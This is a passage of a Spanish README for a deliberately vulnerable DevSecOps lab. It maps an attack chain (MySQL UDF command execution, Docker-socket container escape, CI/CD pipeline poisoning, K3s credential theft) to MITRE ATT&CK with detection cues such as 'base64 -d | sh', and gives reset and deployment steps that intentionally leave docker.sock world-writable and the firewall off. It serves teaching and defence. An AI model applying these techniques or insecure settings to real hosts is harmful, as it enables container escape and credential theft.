    Principal = { Federated = aws_iam_openid_connect_provider.gitea.arn }
    Action = "sts:AssumeRoleWithWebIdentity"
    Condition = { StringEquals = { "${var.gitea_host}:sub" = "repo:${var.gitea_org}/${var.gitea_repo}:ref:refs/heads/main" } }
  }]})
}
```

</details>

### Prevención

Prevención de la exposición de vulnerabilidades:

```
┌───────────────────────────────────────────────────────────────────┐
│  PREVENCIÓN (shift-left)                                            │
│  tfsec / checkov en PR · Gitleaks pre-commit                       │
│  ansible-lint · Kyverno / OPA en admission controller             │
├───────────────────────────────────────────────────────────────────┤
│  DETECCIÓN (runtime)                                               │
│  IAM Access Analyzer · AWS Config Rules · Falco                   │
│  auditd en el host · Pod Security Admission en modo enforce       │
├───────────────────────────────────────────────────────────────────┤
│  RESPUESTA (post-incidente)                                       │
│  Terraform state cifrado · S3 versioning · K3s audit log         │
│  Rotación automática de credenciales · OIDC federation           │
└───────────────────────────────────────────────────────────────────┘
```

---

## MITRE ATT&CK

La cadena toca **11 de las 14 tácticas** de la Matriz Enterprise. Fuera quedan Impact, Resource Development y Reconnaissance, por ser un entorno controlado sin objetivos externos. La tabla lista una técnica por táctica, todas con explotación real en el lab.

| Táctica | Técnica representativa | ID | Detección característica |
|---|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 | WAF: `.php` en directorio de uploads |
| Execution | Command & Scripting Interpreter: Unix Shell — `sys_eval` (UDF) | T1059.004 | MySQL log: `CREATE FUNCTION` + `INTO DUMPFILE` |
| Persistence | Compromise Infrastructure: CI/CD | T1584 | Gitleaks: token en diff de manifiesto |
| Privilege Escalation | Escape to Host | T1611 | Falco: contenedor `privileged` + host mount |
| Defense Evasion | Obfuscated Files or Information | T1027 | Análisis estático: `base64 -d \| sh` en workflow |
| Credential Access | Unsecured Credentials: Kine DB | T1552.007 | auditd: acceso a `state.db` |
| Discovery | Cloud Service Discovery | T1526 | CloudTrail: ráfaga de `list-*` sin user-agent legítimo |
| Lateral Movement | Container API for Lateral Movement | T1610 | Falco: `connect` a `docker.sock` desde proceso no-`dockerd` |
| Collection | Data from Information Repositories | T1213 | FIM sobre `hostPath` de pods de infraestructura |
| Command & Control | Non-Standard Port | T1571 | Egress a puerto distinto de 80/443 desde un pod |
| Exfiltration | Exfiltration to Cloud Storage | T1567.002 | S3 access logs: `PUT` anónimo externo |

> El mapeo técnica por técnica (~40 técnicas), con materialización, detección y mitigación de cada una, está en [`docs/MITRE-MATRIX.md`](docs/MITRE-MATRIX.md).

---

## Notas técnicas y diario de montaje

<details>
<summary><strong>Notas técnicas</strong></summary>

A nivel de contenedor, el de DVWA es lo más aislado del lab (irónico, porque la aplicación es un queso gruyer).

Lo de la API de Docker sin CLI fue por protocolo: sin `docker` ni `curl` y sin nada de red, las peticiones hay que hacerlas a mano sobre el socket con el módulo `socket` de Python. Lo peor no fue eso, sino que los tres fallos que me tuvieron atascado (`alpine` en vez de `mysql:5.7`, `NetworkMode: host`, `Binds` en vez de `mount --bind`) no daban ningún error: el contenedor se crea, arranca y simplemente no hace nada. El del `NetworkMode` me comió una tarde entera; la reverse shell salía por el NAT de la bridge y se perdía.

El CI/CD casi nunca se ve en el modelo de amenazas y es lo más sencillo: literalmente cuesta una línea de YAML.

</details>

<details>
<summary><strong>Diario de montaje y errores levantando la infra</strong></summary>

Estos fallos no forman parte del ataque, pero me comieron su buen rato al montar el lab. Los dejo por si alguien monta algo parecido.

**Gitea volvía una y otra vez al asistente de instalación.** La imagen rootless no puede escribir en `/etc/gitea/app.ini`, justo donde el asistente guarda la config y sus secretos dinámicos. La solución fue saltarme el asistente, dejar toda la config en un `ConfigMap` con `INSTALL_LOCK = true` y los secretos fijados a mano, y usar un `initContainer` que copia la plantilla a una ruta con escritura (`/var/lib/gitea/data/app.ini`). El copiado daba otro `permission denied` porque `busybox` crea el fichero `root:root` y Gitea corre como `git` (UID 1000): lo resolví con un `chown -R 1000:1000` en el propio `initContainer`.

**CPU al 100 % con Docker y K3s a la vez.** K3s trae su propio containerd; con el Docker del host encima, los dos peleaban por los mismos cgroups (y GitLab CE pedía hasta 4 CPU y 8 GB). Lo resolví con runtime único: K3s sobre Docker (`--docker`), que además es lo que necesita el runner.

**El registro del runner.** Lo peor con diferencia. El `act_runner register` estaba hardcodeado en el `command` del Deployment con un token viejo, así que daba igual lo que tocara en el `Secret`. Lo arreglé generando un token de instancia nuevo, editando el Deployment con `kubectl edit` (con `patch` se colaban caracteres invisibles del chat), borrando el `.runner` y reiniciando el pod. Lo suyo sería inyectarlo con `secretKeyRef`.

**DNS en el checkout.** Fallaba con `Could not resolve host: gitea-service...svc.cluster.local` porque los jobs corren como contenedores del Docker del host, fuera de la red de pods de K3s. La solución fue registrar el runner contra la URL NodePort del host (`http://192.168.252.10:30000`) y olvidarme del DNS interno.

**Casi la lío con un rebase.** Un `git reset --hard` al commit equivocado dejó `main` apuntando a un árbol sin `src/` ni `k8s/`. No se había perdido nada (recuperable con `git reflog`); lo arreglé con `git reset --hard <commit bueno>` + `push --force`. La lección: mirar el contenido con `git show --stat` antes de mover la rama a lo bestia.

</details>

---

## Reset del laboratorio

El UDF abuse y el escape dejan rastro (la tabla `udf_blob`, la `.so` en el `plugin_dir`, contenedores `escape1` sueltos), y ese rastro puede confundir un segundo pase.

```bash
# 1 — Contenedores efímeros del escape (en el host)
docker rm -f escape1 2>/dev/null || true

# 2 — Rastro del UDF en MySQL
mysql -u app -pvulnerables dvwa -e "DROP FUNCTION IF EXISTS sys_eval; DROP TABLE IF EXISTS udf_blob;"
rm -f /usr/lib/mysql/plugin/udf_sys.so   # o la ruta que devolviera @@plugin_dir

# 3 — Apps y clúster
kubectl delete -f 04-cicd-pipeline/devsecops-demo/k8s/vulnerable/ --ignore-not-found
kubectl delete -f 03-k8s-cluster/ --ignore-not-found

# 4 — IaC y estado de LocalStack
cd 01-cloud-iac/vulnerable && terraform destroy -auto-approve
cd .. && docker-compose down -v          # -v borra el estado de LocalStack
```

Si arrancas LocalStack con `PERSISTENCE=1`, el estado sobrevive al reinicio y no se limpia con un simple `restart`: usa el `down -v` de arriba.

---

## Despliegue

<details>
<summary><strong>Prerrequisitos, red y orden de despliegue</strong></summary>

### Prerrequisitos

| Componente | Versión | Notas |
|---|---|---|
| SO | Ubuntu 22.04 LTS | Probado también en Debian 12 |
| Docker Engine | 24.x | LocalStack + pods del lab |
| K3s | v1.28+ | Se instala con el script de bootstrap |
| Terraform | 1.6+ | IaC sobre LocalStack |
| Ansible | 2.15+ | Provisioning del host |
| LocalStack | 3.x | Emulador AWS (`docker-compose`) |
| Kubectl / Python | 1.28+ / 3.10+ | Interacción con el clúster / scripts |
| Kali (atacante) | Rolling | `192.168.252.20`; `netcat` requerido |

Provider de Terraform para LocalStack (si no, el `apply` falla con errores raros):

```hcl
provider "aws" {
  access_key = "test"; secret_key = "test"; region = "us-east-1"
  skip_credentials_validation = true
  skip_requester_check        = true
  s3_use_path_style           = true
  endpoints { s3 = "http://192.168.252.10:4566"; iam = "..."; ec2 = "..."; sts = "..." }
}
```

Desde dentro de un pod, el `--endpoint-url` apunta a la IP del host (`192.168.252.10:4566`), no a `localhost`. Para que el contraste vulnerable/hardened se note en ejecución y no solo en el código, arranca LocalStack con `ENFORCE_IAM=1` (parcial).

### Red

```
192.168.252.0/24   Red host / Kali
192.168.252.10     Nodo K3s (control-node, donde corre todo)
192.168.252.20     Kali (atacante)
10.42.0.0/24       Red interna de pods (flannel)
10.43.0.0/24       Red de servicios (ClusterIP)
```

### Orden

```bash
# 1 — Repo
git clone https://github.com/danipalomo/devsecops-lab.git && cd devsecops-lab

# 2 — LocalStack
cd 01-cloud-iac && docker-compose up -d
curl http://localhost:4566/_localstack/health | jq '.services | .s3,.iam,.ec2,.sts'   # → "available"

# 3 — IaC vulnerable
cd vulnerable && terraform init && terraform apply -auto-approve

# 4 — K3s (sobre Docker, runtime único)
curl -sfL https://get.k3s.io | sh -s - --docker --disable metrics-server
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml && kubectl get nodes

# 5 — Provisioning vulnerable
cd ../../02-provisioning && ansible-playbook -i inventory.ini site_vulnerable.yml
ls -la /var/run/docker.sock   # → srw-rw-rw- (0777)   |   ufw status → inactive

# 6 — Gitea + Act-Runner
cd ../03-k8s-cluster && kubectl apply -f gitea-deployment.yaml -f act-runner.yaml

# 7 — DVWA + MySQL
cd ../04-cicd-pipeline/devsecops-demo/k8s/vulnerable
kubectl apply -f mysql-vulnerable.yaml -f dvwa-vulnerable.yaml

# 8 — Configurar Gitea y subir el pipeline
#     http://192.168.252.10:30000  →  git push del devsecops-demo
#     El runner se registra contra la URL NodePort (30000), no contra el DNS interno del clúster.
```

**El entorno está listo cuando:** LocalStack healthy (S3/IAM/EC2/STS) · K3s en `Ready` · pods `Running` en `vulnerable-apps` y `gitea` · DVWA accesible en nivel "Low" · `docker.sock` en `0777` · UFW inactivo.

### Versión hardened (contraste)

```bash
cd 01-cloud-iac/hardened  && terraform apply -auto-approve
cd 02-provisioning        && ansible-playbook -i inventory.ini site_hardened.yml
```

</details>

---

## Referencias

- **MITRE ATT&CK Enterprise** — [attack.mitre.org](https://attack.mitre.org) — vocabulario del mapeo táctico.
- **UDF Abuse (MySQL)** — módulo `lib_mysqludf_sys` de [Rapid7/Metasploit](https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/mysql).
- **Docker socket escape** — análisis de Rory McCune / NCC Group sobre abuso del socket Unix sin CLI.
- **Poisoned Pipeline Execution** — Aviv Grafi, Argon Security (2021), *Attacking CI/CD without any Access to Source Code*.
- **OIDC Federation** — AWS, *Creating OIDC identity providers* + Gitea Actions / `aws-actions/configure-aws-credentials`.
- **K3s Secrets Encryption** — [docs.k3s.io/security/secrets-encryption](https://docs.k3s.io/security/secrets-encryption).
- **tfsec / checkov** — [aquasecurity.github.io/tfsec](https://aquasecurity.github.io/tfsec) · [checkov.io](https://checkov.io).

---

## Glosario

| Término | Significado |
|---|---|
| **UDF** | User-Defined Function. Función cargada en MySQL desde una `.so`; abusada para ejecutar comandos (`sys_eval`). |
| **PPE** | Poisoned Pipeline Execution. Ejecución de código arbitrario inyectando pasos en un workflow de CI/CD. |
| **Kine** | Backend de K3s que traduce la API de Kubernetes a SQL (aquí SQLite en `state.db`), en lugar de `etcd`. |
| **PSA** | Pod Security Admission. Control nativo de Kubernetes que rechaza pods inseguros (`privileged`, `hostPath`…). |
| **OIDC** | OpenID Connect. Federación de identidad para emitir credenciales cloud temporales sin claves estáticas. |
| **LFI** | Local File Inclusion. Inclusión de ficheros locales del servidor; base del Log Poisoning en DVWA. |
| **`docker.sock`** | Socket Unix del daemon de Docker. Acceso a él = control del daemon = root efectivo en el host. |
